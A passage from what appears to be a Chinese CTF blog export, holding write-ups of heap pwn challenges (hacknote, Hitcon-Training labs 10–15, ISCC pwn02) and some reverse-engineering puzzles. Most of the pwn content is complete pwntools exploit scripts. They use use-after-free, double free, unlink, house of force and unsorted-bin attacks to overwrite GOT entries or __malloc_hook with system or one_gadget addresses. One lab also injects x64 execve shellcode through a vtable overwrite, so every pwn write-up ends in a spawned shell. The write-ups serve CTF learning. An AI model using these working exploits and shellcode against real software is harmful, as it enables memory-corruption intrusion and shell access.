$1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) p.recvuntil(':')# debug(0xa1d)p.send('a'*0x19)p.recvuntil('a'*0x18)# addr = u32(p.recv(4))# print "addr --&gt; " + hex(addr)if local: libc_base = u32(p.recv(4))-0x1b2000 - 0x61else: libc_base = u32(p.recv(4))-0x1b0000 - 0x61print "libc_base --&gt; " + hex(libc_base)system = libc_base + libc.symbols['system']binsh_addr = libc_base + libc.search("/bin/sh").next()print "system --&gt; " + hex(system)print "binsh_addr --&gt; " + hex(binsh_addr)print "libc_system --&gt; " + hex(libc.symbols['system'])print "libc_binsh --&gt; " + hex(libc.search("/bin/sh").next())p.recvuntil(':')p.sendline(str(0x23))for i in range(0x18): p.recvuntil(': ') p.sendline('1')p.recvuntil(': ')# debug(0xa9a)p.sendline('+')for i in range(9): p.recvuntil(': ') p.sendline(str(system))p.recvuntil(':')# debug(0xa9a)p.sendline(str(binsh_addr))p.interactive() hacknote这是一道入门堆题，主要有3个功能，增加，删除，打印 1.增加功能可添加任意大小的堆块，并且程序会申请0x10大小的的堆来存放puts函数以及存放内容的堆地址，增加功能最多只能使用5次 2.删除功能，通过index搜索free掉两块堆块，但是free后并没有清空指针，可造成UAF 3.打印，调用存在堆中的puts函数打印内容，这里函数sub_804862B的参数是他本身ptr[v1](ptr[v1]) 漏洞利用有两种泄漏地址的做法：1、申请unsortbin范围的堆块，UAF打印出main_arena地址 ​ 2、puts出got表地址 先讲第一种：申请 chunk0 -&gt; unsortbin范围 ，chunk1 -&gt; fastbin 范围,chunk1是为了使chunk1 free时不合并到top chunk 去。free chunk0 ，再malloc(size(chunk0)) 这时chunk0会被申请出来，单写入一个回车（因为main_arena+48最低字节因定是0xb0），打印出chunk0的内容 -0x0a + 0xb0 - 48就是main_arena地址了。 这时候ptr数组是这样的，我们free掉chunk0,chunk1，fastbin中就会有两个大小为0x10的空闲块0x8753058 -&gt; 0x8753000 -&gt; NULL再申请chunk4大小小于0x10就可以申请到0x8753000为content块写入数据，这样就可以修改0x8753008的内容，将puts函数修改为system内容堆块地址修改成;sh\x00 这里涉及一个知识点：Linux连续执行多条命令：https://blog.csdn.net/freedom2028/article/details/7104131 上面也说到puts函数的参数其实是他本来，所以这们这里覆盖后其实是执行system(system) 所以需要;来过渡。 第二种 puts got表内容做法：先申请两个大小一样的chunk0,chunk1，大小任意，然后free掉，这时候fastbin上就有两个大小为0x10的堆指针，这两个指针其实都是用来控制chunk0,chunk1输出的，这时候申请一个大小小于0x10的chunk2，我们就能分配其中一个指针进行写操作，将chunk0内容指针修改为puts@got，打印出chunk0就可以得到puts的真实地址。得到真实地址后跟方法一做法差不多。free 掉chunk2，fastbin又会出现两个大小为0x10的堆指针，接下来就跟上面link操作一样了，将puts函数改为system，将chunk内容指针改为;sh，print 0就可以了 exp_1123456789101112131415161718192021222324252627282930313233343536373839404142434445# unsort_bin to link addressfrom pwn import *context.log_level = 'debug'p = process('./hacknote')elf = ELF('./hacknote')libc = elf.libcsd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def add(size,content): ru('choice :') sl('1') ru('size :') sl(str(size)) ru('Content :') sd(content)def delete(index): ru('choice :') sl('2') ru('Index :') sl(str(index))def show(index): ru('choice :') sl('3') ru('Index :') sl(str(index))add(64,'n0va')add(32,'rabbit')delete(0)add(64,'\n')show(2)main_arena = u32(rc(4))-0x0a + 0xb0 - 48print "main_arena --&gt; " + hex(main_arena)libc_base = main_arena - 0x1b2780print "libc_base --&gt; " + hex(libc_base)system_addr = libc_base + libc.symbols['system']# gdb.attach(p)delete(0)delete(1)add(8,p32(system_addr) + ';sh\x00')# gdb.attach(p,"b *0x804893D")show(0)# gdb.attach(p)p.interactive() exp_212345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# puts@got to link addressfrom pwn import *context.log_level = 'debug'p = process('./hacknote')# p = remote("chall.pwnable.tw","10102")elf = ELF('./hacknote')libc = elf.libc# libc = ELF('./libc_32.so.6')sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def add(size,content): ru('choice :') sl('1') ru('size :') sl(str(size)) ru('Content :') sd(content)def delete(index): ru('choice :') sl('2') ru('Index :') sl(str(index))def show(index): ru('choice :') sl('3') ru('Index :') sl(str(index))add(32,'abc')add(32,'n0va')delete(0)delete(1)# gdb.attach(p)add(8,p32(0x804862B) + p32(elf.got['puts']))gdb.attach(p)# gdb.attach(p,"b *0x080488D1")show(0)puts_addr = u32(rc(4))print "puts_addr --&gt; " + hex(puts_addr)libc_base = puts_addr - libc.symbols['puts']system_addr = libc_base + libc.symbols['system']binsh_addr = libc_base + libc.search("/bin/sh").next()delete(2)add(8,p32(system_addr) + ';sh\x00')# gdb.attach(p,"b *0x080488D1")show(0)# gdb.attach(p)p.interactive()]]></content>
  </entry>
  <entry>
    <title><![CDATA[桂电2019 re write up]]></title>
    <url>%2F2019%2F05%2F24%2F%E6%A1%82%E7%94%B52019re%2F</url>
    <content type="text"><![CDATA[rechecksec 一下发现加了upx壳，upx -d 脱壳 IDA f5发现 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364_BOOL8 __fastcall sub_4009AE(char *a1)&#123; if ( 1629056 * *a1 != 166163712 ) return 0LL; if ( 6771600 * a1[1] != 731332800 ) return 0LL; if ( 3682944 * a1[2] != 357245568 ) return 0LL; if ( 10431000 * a1[3] != 1074393000 ) return 0LL; if ( 3977328 * a1[4] != 489211344 ) return 0LL; if ( 5138336 * a1[5] != 518971936 ) return 0LL; if ( 7532250 * a1[7] != 406741500 ) return 0LL; if ( 5551632 * a1[8] != 294236496 ) return 0LL; if ( 3409728 * a1[9] != 177305856 ) return 0LL; if ( 13013670 * a1[10] != 650683500 ) return 0LL; if ( 6088797 * a1[11] != 298351053 ) return 0LL; if ( 7884663 * a1[12] != 386348487 ) return 0LL; if ( 8944053 * a1[13] != 438258597 ) return 0LL; if ( 5198490 * a1[14] != 249527520 ) return 0LL; if ( 4544518 * a1[15] != 445362764 ) return 0LL; if ( 3645600 * a1[17] != 174988800 ) return 0LL; if ( 10115280 * a1[16] != 981182160 ) return 0LL; if ( 9667504 * a1[18] != 493042704 ) return 0LL; if ( 5364450 * a1[19] != 257493600 ) return 0LL; if ( 13464540 * a1[20] != 767478780 ) return 0LL; if ( 5488432 * a1[21] != 312840624 ) return 0LL; if ( 14479500 * a1[22] != 1404511500 ) return 0LL; if ( 6451830 * a1[23] != 316139670 ) return 0LL; if ( 6252576 * a1[24] != 619005024 ) return 0LL; if ( 7763364 * a1[25] != 372641472 ) return 0LL; if ( 7327320 * a1[26] != 373693320 ) return 0LL; if ( 8741520 * a1[27] != 498266640 ) return 0LL; if ( 8871876 * a1[28] != 452465676 ) return 0LL; if ( 4086720 * a1[29] != 208422720 ) return 0LL; if ( 9374400 * a1[30] == 515592000 ) return 5759124 * a1[31] == 719890500; return 0LL;&#125; 只能说，出题人真无聊，不过也挺有耐心的，直接跑脚本 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;using namespace std;int main()&#123; string flag = "********************************"; flag[0] = (char)(166163712 / 1629056 ); flag[1] = (char)(731332800 / 6771600 ); flag[2] = (char)(357245568 / 3682944 ); flag[3] = (char)(1074393000 / 10431000 ); flag[4] = (char)(489211344 / 3977328 ); flag[5] = (char)(518971936 / 5138336 ); flag[6+1] = (char)(406741500 / 7532250 ); flag[7+1] = (char)(294236496 / 5551632 ); flag[8+1] = (char)(177305856 / 3409728 ); flag[9+1] = (char)(650683500 / 13013670 ); flag[10+1] = (char)(298351053 / 6088797 ); flag[11+1] = (char)(386348487 / 7884663 ); flag[12+1] = (char)(438258597 / 8944053 ); flag[13+1] = (char)(249527520 / 5198490 ); flag[14+1] = (char)(445362764 / 4544518 ); flag[16+1] = (char)(174988800 / 3645600 ); flag[15+1] = (char)(981182160 / 10115280 ); flag[17+1] = (char)(493042704 / 9667504 ); flag[18+1] = (char)(257493600 / 5364450 ); flag[19+1] = (char)(767478780 / 13464540 ); flag[20+1] = (char)(312840624 / 5488432 ); flag[21+1] = (char)(1404511500 / 14479500 ); flag[22+1] = (char)(316139670 / 6451830 ); flag[23+1] = (char)(619005024 / 6252576 ); flag[24+1] = (char)(372641472 / 7763364 ); flag[25+1] = (char)(373693320 / 7327320 ); flag[26+1] = (char)(498266640 / 8741520 ); flag[27+1] = (char)(452465676 / 8871876 ); flag[28+1] = (char)(208422720 / 4086720 ); flag[29+1] = (char)(515592000 / 9374400 ); flag[30+1] = (char)(719890500 / 5759124 ); cout&lt;&lt;flag&lt;&lt;endl; return 0; &#125; encrypt 主要对输入字符串 s 执行两次操作，第一次是异或 由于我在IDA并没有找到v9的值 ，所以从gdb上一个一个记录下来了，但是其实后来发现v9是由sub_4006b6得来的，但是懒得去逆这个函数了（反正数据我已经拿到了） 1data = [0x10,0x59,0x9c,0x92,0x6,0x22,0xcf,0xa5,0x72,0x1e,0x45,0x6a,0x6,0xcb,0x8,0xc3,0xe4,0x49,0x5a,0x63,0xc,0xdf,0xf6,0x5f,0x8,0x28,0xbd,0xe2,0x10,0x15,0x1f,0x6e,0xaa,0x5a,0xca,0xec,0x80,0xaf,0x9b,0x16,0xbb,0x3d,0x13,0x2f,0x6a,0xa4,0xc7,0x2e,0xbc,0x4b,0x60,0x9a] 异或后到了一个base64加密的位置，一开始我以为是base64加密，但是第一：没有表，第二：加了61，所以其实就是拿了base64移位的操作得到下标（0~64）然后+61变成可见字符 ，再跟’Z`TzzTrD|fQP[_VVL|yneURyUmFklVJgLasJroZpHRxIUlH\vZE=’对应 所以，思路就很清晰了 1、这串字符串-61得到base64的下标，对应上base64表得到base64加密结果，再解密回去 2、异或data得到flag number_game这道 题还算挺有意思 的，搞到最后是一个数独 先检测输入，只能是[0,1,2,3,4] 这里用递归将输入放在了堆块中，为后面的乱序做准备 这里打乱输入顺序写入a2，其实就是递归查找，当下一个（+8）没有时，就写入，所以顺序就是7381940526 继续往下，就是填数独了，填完检测， 123451 4 # 2 33 0 # 1 #0 # 2 3 ## 3 # # 04 2 # # 1 123451 4 0 2 33 0 4 1 20 1 2 3 42 3 1 4 04 2 3 0 1 所以填入的数据 是0421421430，根据打乱的顺序排回去得到1134240024]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Hitcon-Training lab10~lab15]]></title>
    <url>%2F2019%2F05%2F15%2FHitcon-Training(%E4%B8%8B)%2F</url>
    <content type="text"><![CDATA[lab10这一题开始就是堆的范畴了 题目介绍程序只开启了NX保护 有三个功能，分别是add，delete跟print 123456---------------------- 1. Add note 2. Delete note 3. Print note 4. Exit ---------------------- 先一看一下add: 主要过程就是先申请一个8的堆用来存储print函数和数据的地址（也是堆地址），数据另外存储在新申请的malloc(size)堆中， 然后这个8大小的指针会存到bss去(notelist)，也就是如下图 接下来看delete函数： 通过indext free 掉add过程中申请的两个堆空间，但是free后并没有将指针清空，而且指针扔留在bss中，所以就存在了Use-After_Free printf函数： 通过indext找到对应的printf 函数调用 程序中还存在cat flag函数，所以我们只需要想方法调用这个函数就行了 利用过程通过分析程序的功能我们发现存在uaf漏洞，具体但用过程： 1、先申请3个chunk块，大小为16（fast bin 范围内即可） 2、free 掉chunk1、chunk2 此时fast bin 中的分布是这样的： 123fastbins0x10: 0x97c5028 —▸ 0x97c5000 ◂— 0x00x18: 0x97c5038 —▸ 0x97c5010 ◂— 0x0 notelist 中是这样的： 12345pwndbg&gt; telescope 0x0804A07000:0000│ 0x804a070 (notelist) —▸ 0x97c5008 ◂— 0x001:0004│ 0x804a074 (notelist+4) —▸ 0x97c5030 —▸ 0x97c5000 ◂— 0x002:0008│ 0x804a078 (notelist+8) —▸ 0x97c5058 —▸ 0x804865b (print_note_content) ◂— push ebp03:000c│ 0x804a07c (notelist+12) ◂— 0x0 此时我们再申请一个大小为8的chunk，内容为magic函数地址，这样，0x97c5000就会指向magic函数 123456pwndbg&gt; telescope 0x0804A07000:0000│ 0x804a070 (notelist) —▸ 0x97c5008 —▸ 0x8048986 (magic) ◂— push ebp01:0004│ 0x804a074 (notelist+4) —▸ 0x97c5030 —▸ 0x804865b (print_note_content) ◂— push ebp02:0008│ 0x804a078 (notelist+8) —▸ 0x97c5058 —▸ 0x804865b (print_note_content) ◂— push ebp03:000c│ 0x804a07c (notelist+12) —▸ 0x97c5030 —▸ 0x804865b (print_note_content) ◂— push ebp04:0010│ 0x804a080 (notelist+16) ◂— 0x0 printf chunk1即可执行magic函数 exp: 123456789101112131415161718192021222324252627282930313233from pwn import *p = process('./hacknote')context.log_level = 'debug'catflag = 0x8048986def Add(size,string): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Note size :') p.sendline(str(size)) p.recvuntil('Content :') p.sendline(string)def Delete(i): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Index :') p.sendline(str(i))def Print(i): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Index :') p.sendline(str(i))Add(16,'n0va_1')# gdb.attach(p,"b *0x8048A8C")Add(16,'n0va_2')Add(16,'n0va_3')# gdb.attach(p,"b *0x8048A8C")Delete(0)Delete(1)Add(8,p32(catflag))Print(0)p.interactive() lab 11首先程序的功能很简单，增、删、查、改 在change功能中没有对len进行检测，存在任意长度的堆溢出 同时函数有可以直接读flag的后门函数 程序在开始的时候申请了一个大小为0x20的堆块用来存放hello_message跟goodbye_message函数指针，开始时调用hello，结束时调用goodbye 最简单的做法就是house of force 申请到存放goodbye指针的堆块，修改goodbye为magic exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *context.log_level = 'debug'local = 1if local: p = process('./bamboobox') elf = ELF('./bamboobox') libc = elf.libcelse: p = remote("")sl = lambda s:p.sendline(s)sd = lambda s:p.send(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def add(len,name): ru('choice:') sl('2') ru('name:') sl(str(len)) ru('item:') sl(name)def change(index,len,name): ru('choice:') sl('3') ru('item:') sl(str(index)) ru('name:') sl(str(len)) ru('item:') sd(name)def remove(index): ru('choice:') sl('4') ru('item:') sl(str(index))def show(): ru('choice:') sl('1')itemlist = 0x6020C0magic = 0x400D49add(0x400,'b')add(0x10,'a')#0pay = p64(0)*3 + p64(0xffffffffffffffff)change(1,0x100,pay)# gdb.attach(p,"b *0x400A6F")add(-0x460,'a')pay = p64(magic)*2add(0x100,pay)ru('choice:')sl('5')# gdb.attach(p)p.interactive() 做为练习，感觉用后门太*了，所以也可以通过unlink修改got表getshell exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *context.log_level = 'debug'local = 1if local: p = process('./bamboobox') elf = ELF('./bamboobox') libc = elf.libcelse: p = remote("")sl = lambda s:p.sendline(s)sd = lambda s:p.send(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def add(len,name): ru('choice:') sl('2') ru('name:') sl(str(len)) ru('item:') sl(name)def change(index,len,name): ru('choice:') sl('3') ru('item:') sl(str(index)) ru('name:') sl(str(len)) ru('item:') sd(name)def remove(index): ru('choice:') sl('4') ru('item:') sl(str(index))def show(): ru('choice:') sl('1')itemlist = 0x6020C0add(0x20,'a')#0add(0x90,'b')#1add(0x90,'c')#2# add(0x20,'d')#3fack_chunk = 0x6020c8fd = fack_chunk - 0x18bk = fack_chunk - 0x10pay = p64(0) + p64(0x21) + p64(fd) + p64(bk) + p64(0x20) + p64(0xa0)change(0,0x30,pay)remove(1)pay = p64(0)*2pay += p64(0x100) + p64(itemlist)#0pay += p64(0x100) + p64(elf.got['free'])#1pay += p64(0x100) + p64(elf.got['malloc'])#2pay += p64(0x100) + p64(elf.got['atoi'])#3change(0,0x100,pay)change(1,0x10,p64(elf.plt['puts'])[:-1])remove(2)malloc_addr = u64(rc(6).ljust(8,'\x00'))libc_base = malloc_addr - libc.symbols['malloc']system = libc_base + libc.symbols['system']log.info("malloc_addr --&gt; %s",hex(malloc_addr))log.info("libc_base --&gt; %s",hex(libc_base))log.info("system --&gt; %s",hex(system))pay = p64(0x100) + p64(elf.got['free'])pay += p64(0x100) + p64(elf.got['malloc'])change(0,0x100,pay)change(0,0x100,p64(system)[:-1])change(1,0x100,'/bin/sh')remove(1)# gdb.attach(p)p.interactive() lab12程序功能： 跟常规堆题一样有一个flowlist的全局数组来存放堆块，在del函数中只是将标记置为0，并没有将指针置空，所以存在uaf 利用思路： 泄漏出libc地址 —&gt; double free attack 修改malloc_hook为onegadget，调用malloc getshell exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#coding:utf-8from pwn import *context.log_level = 'debug'local = 1if local: p = process('./secretgarden') elf = ELF('./secretgarden') libc = elf.libcelse: p = remote("") # elf = ELF('./')#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def add(l,name,c): ru(": ") sl("1") ru(":") sl(str(l)) ru(":") sd(name) ru(":") sl(c)def visit(): ru(": ") sl("2")def remove(id): ru(": ") sl("3") ru(":") sl(str(id))def clean(): ru(": ") sl("4")flowerlist = 0x6020E0add(0x80,'a','ac')#0add(0x20,'b','bc')#1remove(0)clean()add(0x80,'\n','cc')#2visit()ru("[0] :")one = [0x45216,0x4526a,0xf02a4,0xf1147]main_arena = u64(rc(6).ljust(8,'\x00')) - 0x0a + 0x78 - 88malloc_hook = main_arena - 0x10libc_base = malloc_hook - libc.symbols['__malloc_hook']onegadget = libc_base + one[1]fack_chunk = malloc_hook - 0x23log.info("main_arena --&gt; %s",hex(main_arena))log.info("malloc_hook --&gt; %s",hex(malloc_hook))log.info("libc_base --&gt; %s",hex(libc_base))log.info("onegadget --&gt; %s",hex(onegadget))log.info("fack_chunk --&gt; %s",hex(fack_chunk))add(0x60,'3','3c')#2add(0x60,'4','4c')#3remove(2)remove(3)remove(2)pay = p64(fack_chunk)*2add(0x60,pay,'4c')#4add(0x60,'5','5c')#5add(0x60,'6','6c')#6pay = 0x13*'a' + p64(onegadget)add(0x60,pay,'7c')#7ru(": ")sl("1")# gdb.attach(p)p.interactive() lab13常规堆题，增、删、查、改以及一个全局数组heaparray edit 函数中存在off-by-one 利用思路：首先申请chunk0，chunk1，edit chunk0修改chunk1的size ，然后free掉chunk1 再申请一个新的chunk1，使得chunk1落在指向chunk1的堆块上，从而能够修改chunk1的内容指针 修改chunk1内容指针为got表泄漏出真实地址 改free的got表为system地址，然后使得chunk0内容为’/bin/sh\x00’，free(0) getshell exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#coding:utf-8from pwn import *context.log_level = 'debug'local = 1if local: p = process('./heapcreator') elf = ELF('./heapcreator') libc = elf.libcelse: p = remote("") # elf = ELF('./')#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def create(size,data): ru(":") sl('1') ru(": ") sl(str(size)) ru(":") sd(data)def edit(id,data): ru(":") sl('2') ru(":") sl(str(id)) ru(": ") sl(data)def show(id): ru(":") sl('3') ru(":") sl(str(id))def delete(id): ru(":") sl('4') ru(":") sl(str(id))heaparray = 0x6020A0create(0x18,'a')#0create(0x18,'b')#1edit(0,'/bin/sh\x00' + 0x10*'a' + '\x41')delete(1)create(0x30,p64(0)*4 + p64(0x30) + p64(elf.got['free']))show(1)ru("Content : ")free_addr = u64(ru('\n').strip('\n').ljust(8,'\x00'))libc_base = free_addr - libc.symbols['free']system = libc_base + libc.symbols['system']log.info("free_addr --&gt; %s",hex(free_addr))log.info("libc_base --&gt; %s",hex(libc_base))log.info("system --&gt; %s",hex(system))edit(1,p64(system))delete(0)# gdb.attach(p)p.interactive() lab 14edit函数没有对size检测存在任意长度堆溢出，且程序存在cat flag的后门 做法1unsortedbin attack :利用堆溢出修改在unsortedbin列表尾部的bk为0x6020C0重新申请即可将0x6020C0修改成main_arena（unsortedbin 为FIFO）从而利用后门 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#coding:utf-8from pwn import *context.log_level = 'debug'local = 1if local: p = process('./magicheap') # elf = ELF('./magicheap') # libc = elf.libcelse: p = remote("") # elf = ELF('./')#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def create(size,data): ru(":") sl('1') ru(": ") sl(str(size)) ru(":") sl(data)def edit(id,size,data): ru(":") sl('2') ru(":") sl(str(id)) ru(": ") sl(str(size)) ru(": ") sl(data)def delete(id): ru(":") sl('3') ru(":") sl(str(id))heaparray = 0x6020E0magic = 0x6020C0create(0x10,'a')#0create(0x80,'b')#1create(0x10,'c')#2delete(1)pay = 0x10*'a' + p64(0) + p64(0x91) + p64(magic - 0x10)*2edit(0,0x30,pay)create(0x80,'d')ru(":")sl('4869')# gdb.attach(p)p.interactive() 做法2unlink 修改free@got为system，再free掉一块内容为’/bin/sh\x00’的堆块getshell 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#coding:utf-8from pwn import *context.log_level = 'debug'local = 1if local: p = process('./magicheap') elf = ELF('./magicheap') libc = elf.libcelse: p = remote("") # elf = ELF('./')#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def create(size,data): ru(":") sl('1') ru(": ") sl(str(size)) ru(":") sl(data)def edit(id,size,data): ru(":") sl("2") ru(":") sl(str(id)) ru(": ") sl(str(size)) ru(": ") sl(data)def delete(id): ru(":") sl('3') ru(":") sl(str(id))heaparray = 0x6020E0create(0x20,'a')#0create(0x80,'b')#1create(0x20,'/bin/sh\x00')#2create(0x20,'/bin/sh\x00')#3fd = heaparray - 0x18bk = heaparray - 0x10pay = p64(0) + p64(0x21)pay += p64(fd) + p64(bk)pay += p64(0x20) + p64(0x90)edit(0,0x30,pay)pay = p64(0)*3pay += p64(elf.got['free'])pay += p64(elf.got['puts'])delete(1)edit(0,0x30,pay)edit(0,8,p64(elf.plt['puts']))delete(1)ru('Index :')puts_addr = u64(rc(6).ljust(8,'\x00'))libc_base = puts_addr - libc.symbols['puts']system = libc_base + libc.symbols['system']log.info("puts_addr --&gt; %s",hex(puts_addr))log.info("libc_base --&gt; %s",hex(libc_base))log.info("system --&gt; %s",hex(system))edit(0,8,p64(system))delete(3)# gdb.attach(p)p.interactive() lab15这是一道C++pwn，涉及到一个C++的虚表的问题，在c++的类中的虚表会通过一个叫虚表的东西进行跳转从而执行函数，关于虚表的知识点可以参考这位大佬：http://showlinkroom.me 一片红，NX都没开，还有RWX段，显然可以写shellcode，解题的思路在于，修改虚表，跳转到shellcode的位置执行。 虚表大概可以理解为：一个视情况指向相对应函数地址的指针（很显然这说法是错的） 虚表大概是这样子： 而且我们要让它变成这样： 结合IDA我们能看到，新申请的类是放在animallist数组中的，也就是说animallist存着指向虚表的指针 先申请两个dog，我们可以看到，animallist上存放着指针指向一个指向Dog::speak函数的指针（也就是虚表） 结构清楚了，再来看程序，这里没有限制长度，可以造成堆溢出而且长度不限，所以我们只需要通过溢出将指向shellcode地址的指针写到0xf4ac20上就行了 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#coding:utf-8from pwn import *context.log_level = 'debug'local = 1if local: p = process('./zoo') # elf = ELF('./zoo') # libc = elf.libcelse: p = remote("") # elf = ELF('./')#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def adddog(name,weight): ru(":") sl('1') ru(": ") sl(name) ru(": ") sl(str(weight))def addcat(name,weight): ru(":") sl('2') ru(": ") sl(name) ru(": ") sl(str(weight))def showanimal(id): ru(":") sl('4') ru(": ") sl(str(id))def remove(id): ru(":") sl('5') ru(": ") sl(str(id))def listen(id): ru(":") sl('3') ru(": ") sl(str(id))animallist = 0x605490edata = 0x605120nameofzoo = 0x605420ru(":")shellcode = shellcode_x64 = 'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'sl(shellcode + p64(nameofzoo))adddog('dog1',0)adddog('dog2',1)# gdb.attach(p)remove(0)pay = 0x48*'a' + p64(nameofzoo + len(shellcode))adddog(pay,1)listen(0)# gdb.attach(p)p.interactive()]]></content>
      <categories>
        <category>堆</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ISCC的pwn02]]></title>
    <url>%2F2019%2F05%2F13%2FISCC%E7%9A%84pwn02%2F</url>
    <content type="text"><![CDATA[12345Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 保护只开启了NX，程序有3个功能： 1231、malloc + get2、free3、puts ) 程序漏洞主要在free这里，释放空间后对应的指针没有清空，于是便存在Use After Free漏洞 做法一：onegadget利用思路：利用uaf泄漏出真实地址，doouble free构造假chunk覆盖 malloc_hook 为onegadget 1、首先，申请一个unsort bins 范围大小的空间，然后释放，此时这块chunk的fd,bk就会指向main_arena+88，puts打印出来-88-0x10就得到了mallo_hook的真实地址 2、接下来要构造假的chunk ，需要先double free 一下，再利用uaf将fack_chunk 链到fasbins上，但是在malloc申请空间时会有一个检测：检测size of chunk 是否是fastbin范围内，所以需要找到一处值为0x00~0x80的位置， 在malloc_hook-0x23处，便存在这样的数据,基为0x7f，所以我们要申请0x70大小的空间。 12345pwndbg&gt; hexdump 0x7f7245e21b10-0x23+0000 0x7f7245e21aed 00 00 00 60 02 e2 45 72 7f 00 00 00 00 00 00 00 │...`│..Er│....│....│+0010 0x7f7245e21afd 00 00 00 20 2e ae 45 72 7f 00 00 00 2a ae 45 72 │....│..Er│....│*.Er│+0020 0x7f7245e21b0d 7f 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │....│....│....│....│+0030 0x7f7245e21b1d 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 │....│....│....│....│ 3、空间申请成功后，将malloc_hook覆盖为onegadget 地址再调用一次gets函数getshell 做法二：system(‘/bin/sh’)因为远程对/bin/sh替换成了catflag，onegadget并不能getshell （我也母鸡为什么不行），那断然不行，就只能换一种做法了，程序中还存在sh函数 所以思路就变成，将malloc_hook覆盖成sh地址，并且传入参数a1 = ‘/bin/sh’，a1就是malloc(size)的size 所以只需要将size设为指向字符串’/bin/sh’的地址就行了，那么问题又来了，这个指针无疑就是堆指针，所以要先泄漏堆地址：double free再puts就行了 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#coding:utf-8from pwn import *p = process('./pwn02')# p = remote("39.100.87.24","8102")elf = ELF('./pwn02')libc = elf.libccontext.log_level = 'debug'def gets(i,size,s): p.recvuntil('&gt; ') p.sendline('1 ' + str(i)) p.sendline(str(size) +'\n' + s)def free(i): p.recvuntil('&gt; ') p.sendline('2 ' + str(i))def puts(i): p.recvuntil('&gt; ') p.sendline('3 ' + str(i))# 泄漏malloc_hook(main_arena+88-88-0x10)gets(0,0x300,'n0va_1')gets(1,0,'n0va_2')free(0)puts(0)# (main_arena+88)-88-0x10malloc_hook = u64(p.recv(6).ljust(8,'\x00')) - 88 - 0x10print "malloc_hook --&gt; " + hex(malloc_hook)offset = malloc_hook - libc.symbols['__malloc_hook']onegadget = offset + 0x4526a #0xf02a4 - 0xf1147print "onegadget --&gt; " + hex(onegadget)fack_chunk = malloc_hook - 0x23print "fack_chunk --&gt; " + hex(fack_chunk)# gdb.attach(p,"b 